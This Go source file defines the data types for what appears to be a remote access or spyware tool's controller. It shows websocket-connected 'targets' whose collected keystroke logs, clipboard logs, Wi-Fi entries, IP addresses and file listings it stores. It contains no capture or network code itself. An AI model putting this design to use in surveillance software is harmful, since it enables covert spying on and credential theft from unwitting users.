package lib

import (
	"github.com/gorilla/websocket"
)

// Client struct
type Client struct {
	Socket *websocket.Conn
}

// Target struct
type Target struct {
	Socket  *websocket.Conn
	Details TargetDetails
}

// TargetDetails contains all the information about a client
type TargetDetails struct {
	Net          TargetNetDetails  `json:"net"`
	Wifi         map[string]string `json:"wifi"`
	Hardware     HardwareInfo      `json:"hardware"`
	Keylog       []string          `json:"keylog"`
	Applog       []string          `json:"applog"`
	Clipboardlog []string          `json:"clipboardLog"`
	Directory    DirectoryInfo     `json:"directoryInfo"`
}

// DirectoryInfo contains information about the currently selected directory
type DirectoryInfo struct {
	Path   string     `json:"path"`
	Type   string     `json:"type"`
	Drives []string   `json:"drives"`
	Files  []FileInfo `json:"files"`
}

// FileInfo stores information about a file
type FileInfo struct {
	Name string `json:"name"`
	Type string `json:"type"`
}

// TargetNetDetails stores network information about a target
type TargetNetDetails struct {
	Hostname  string `json:"host"`
	PrivateIP string `json:"privateIP"`
	PublicIP  string `json:"publicIP"`
}

// HardwareInfo stores information about the target's hardware
type HardwareInfo struct {
	CPU string `json:"cpu"`
}

type Log struct {
	Keylog       []string `json:"keylog"`
	Applog       []string `json:"applog"`
	Clipboardlog []string `json:"clipboardLog"`
}
